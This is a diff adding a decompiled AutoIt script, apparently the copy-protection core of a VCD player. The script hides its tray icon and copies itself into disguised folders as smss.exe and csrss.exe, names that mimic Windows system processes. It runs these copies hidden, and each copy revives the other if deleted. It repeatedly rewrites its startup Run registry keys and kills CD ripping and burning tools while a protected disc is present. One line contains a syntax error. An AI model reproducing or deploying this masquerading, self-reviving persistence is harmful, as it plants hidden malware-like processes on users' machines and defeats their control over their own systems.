@@ -1,0 +1,187 @@
+; <AUT2EXE VERSION: 3.0.102.0>
+
+; ----------------------------------------------------------------------------
+; <AUT2EXE INCLUDE-START: C:\000-AutoPlay Media Studio 5.0 Pro\EVS\VCDPlayProject-18-02-48\00-AutoIt3\RUN_CORE.AU3>
+; ----------------------------------------------------------------------------
+
+;Modify on 19-01-2005
+;01-02-05 Remove "Spy from data base
+                 ;Add "Cloning" to data base
+;03-02-48  Add "DiskJuggler"   and "Rawcopy"  to database
+;18-02-48 Add BadCopy to database
+                 ;Kill ISOBuster when active in 2 minute
+
+;------------------Hide Tray Icon -------------------------------------------
+;Close CloneCD
+Opt("WinWaitDelay", 250)
+Opt("TrayIconHide", 1)          ;0=show, 1=hide tray icon
+;================================================
+
+;---------------------Declare Folders  ---------------------------------------------------------------------------------------------------------
+;These folder have been created from main application eg.VCDPlay.exe
+
+$CenterFolder = "C:\WINDOWS\Driver Cache\i386\Level4"
+       ;---This folder is for "RUN_Core.exe(Run_Core.exe)"
+;MsgBox(4096,"CenterFolder",$CenterFolder)
+
+$csrssFolder = "C:\Windows\System\Level4"
+;MsgBox(4096,"$csrssFolder",$csrssFolder)
+
+$smssFolder = "C:\Program Files\Windows Media Player\Skins\WindowsMediaSkin\Data\Level4"
+;MsgBox(4096,"$smssFolder ",$smssFolder)
+;=========================================================================================
+
+;Sleep(1000)
+
+ ;-------------------------------------Loop to close all ripping tools -----------------------------------------------------------------------------------
+$i = 0
+Do
+
+         ;---------------Buddy Routine Prevent  ReNaming smss.exe and csrss.exe----------------------------------------
+        If FileExists($smssFolder & "\smss.exe")  = 0  Then
+                   FileCopy($CenterFolder & "\RUN_Core.exe", $smssFolder & "\smss.exe")
+                   Run($smssFolder & "\smss.exe", "", @SW_HIDE)
+                   Sleep(1000)  ; 1 seconds
+         EndIf
+        If FileExists($csrssFolder & "\csrss.exe")  = 0  Then
+                  FileCopy($CenterFolder & "\RUN_Core.exe", $csrssFolder & "\csrss.exe")
+                  Run($csrssFolder & "\csrss.exe"), "", @SW_HIDE)
+         EndIf
+         ;==================================================================================
+
+         ;---------------Buddy Routine Prevent  Registry cahnge at startup----------------------------------------------------------------------------
+         $KeyName      = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+         $ValueName1  = "smssLevel4"
+         $ValueName2  = "csrssLevel4"
+         $Type               =  "REG_SZ"
+         $Data1                = $smssFolder & "\smss.exe"
+         $Data2                = $csrssFolder & "\csrss.exe"
+         $var1 = RegRead($KeyName , $ValueName1)
+         $var2 = RegRead($KeyName , $ValueName2)
+
+         If $var1 <> $Data1   then
+                RegWrite($KeyName, $ValueName1, $Type, $Data1)
+         EndIf
+         If $var2 <> $Data2   then
+                RegWrite($KeyName, $ValueName2, $Type, $Data2)
+         EndIf
+         ;=============================================================================================
+
+
+         ;================Always close ITC_XXXX Folder ==========================================
+          AutoItSetOption("WinTitleMatchMode", 4)
+          WinWaitActive("ITC_", "",1)   ;Wait CloneCD window 1 sec.
+          WinClose ("ITC_")    ; Closes the previously matched  window
+         ;--------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+        ;================Always close IISOBuster==== ==========================================
+          AutoItSetOption("WinTitleMatchMode", 4)
+          If   WinActive("IsoBuster") =  1     then
+                    ;MsgBox(4096,"Notice" , "Found ISOBuster")
+                     Sleep(30000)
+	$var = DriveGetDrive( "CDROM")
+	If NOT @error Then
+	           ;MsgBox(4096,"", "Found " & $var[0] & " drives")
+                                 For $i = 1 to $var[0]
+                                ; If  DriveStatus($var[$i]  ) <> "NOTREADY"  then
+                                            ;MsgBox(4096,"Drive " & $i, $var[$i] )
+                                            $VolumeLabel = DriveGetLabel ( $var[$i]  )
+                                            ;MsgBox(4096,"Volume Label: ",$VolumeLabel   )
+                                            If   $VolumeLabel  = 1 then
+                                                      ;MsgBox(4096,"Drive " & $i  ,  $var[$i]  & "  Volume Label:" & $VolumeLabel   & " Drive is Empty" )
+                                            EndIf
+                                            If   $VolumeLabel  <> 1 then
+                                                      ;MsgBox(4096,"Drive " & $i , $var[$i]  & "  Volume Label:" & $VolumeLabel   & " Drive is NOT Empty" )
+                                                      $i = $var[0]+2  ;Exit the loop
+
+                                            EndIf
+
+                                 ;EndIf
+                                 Next
+	EndIf
+
+                    ;MsgBox(4096,"Notice" , "$i=" & $i)
+                     If $i = $var[0]+1 then
+	           WinKill ("IsoBuster")    ; Closes the previously matched  window
+                     EndIf
+
+
+          EndIf
+         ;--------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+          ;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+	$var = DriveGetDrive( "CDROM")
+	If NOT @error Then
+	    ;MsgBox(4096,"", "Found " & $var[0] & " drives")
+
+	     For $i = 1 to $var[0]
+
+	            If  DriveStatus($var[$i] &  "\Poosit.Dat" ) <> "NOTREADY"  or  DriveStatus($var[$i] &  "\CDl\CDI_TEXT.FNT") <> "NOTREADY"    then
+	                    ;MsgBox(4096,"Drive " & $i, $var[$i] & "\Poosit.dat")
+                                          ;MsgBox(4096,"Drive " & $i, $var[$i] &  "\CDl\CDI_TEXT.FNT")
+	                    $Size1 = FileGetSize($var[$i] & "\Poosit.dat")
+                                         $Size2 = FileGetSize($var[$i] & "\CDl\CDI_TEXT.FNT")
+	                    If  $Size1 > 850000000  or  $Size2 >  850000000   then
+	                           ;MsgBox(4096,"", "Size is:  " &  $Size2)
+
+                                                 ;-----Below are Windows Title to be  closed ---------------------------------------------
+
+	                            WinKill ("CloneCD")    ; Closes the previously matched  window
+
+                                                 WinClose("Nero")    ; Closes the previously matched  window
+
+	                            WinClose("IsoBuster")    ; Closes the previously matched  window
+
+	                            WinClose("Alcohol")    ; Closes the previously matched  window
+
+	                            WinClose("BlindWrite")    ; Closes the previously matched  window
+
+	                            WinClose("CloneCD")    ; Closes the previously matched  window
+
+	                            WinClose("Nero")    ; Closes the previously matched  window
+
+	                            WinClose("IsoBuster")    ; Closes the previously matched  window
+
+	                            WinClose("VCDGear")    ; Closes the previously matched  window
+
+	                            ;WinClose("Spy")    ; Closes the previously matched  window
+
+                                                 WinClose("Circle Virtual CD")    ; Closes the previously matched  window
+
+                                                 WinClose("Virtual CD")    ; Closes the previously matched  window
+
+                                                 WinClose("Virtual Drive")    ; Closes the previously matched  window
+
+                                                 WinClose("VirtualDrive")    ; Closes the previously matched  window
+
+	                           WinClose("CD Anywhere")    ; Closes the previously matched  window
+
+	                           WinClose("ClonyXXL")    ; Closes the previously matched  window
+
+	                           WinClose("DiscJuggler")    ; Closes the previously matched  window
+
+	                           WinClose("VCDCut")    ; Closes the previously matched  window
+
+	                           WinClose("BadCopy")    ; Closes the previously matched  window
+                                              ;====================================================================
+
+ 	                    EndIf
+	             EndIF
+	    Next
+
+	EndIf
+           ;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+
+           ;WinWaitActive("CloneCD", "",1)   ;Wait CloneCD window 1 sec. to lower CPU usage
+
+           $i = $i + 0
+
+Until $i = 10
+;=========================================================================================================
+
+; ----------------------------------------------------------------------------
+; <AUT2EXE INCLUDE-END: C:\000-AutoPlay Media Studio 5.0 Pro\EVS\VCDPlayProject-18-02-48\00-AutoIt3\RUN_CORE.AU3>
+; ----------------------------------------------------------------------------
+
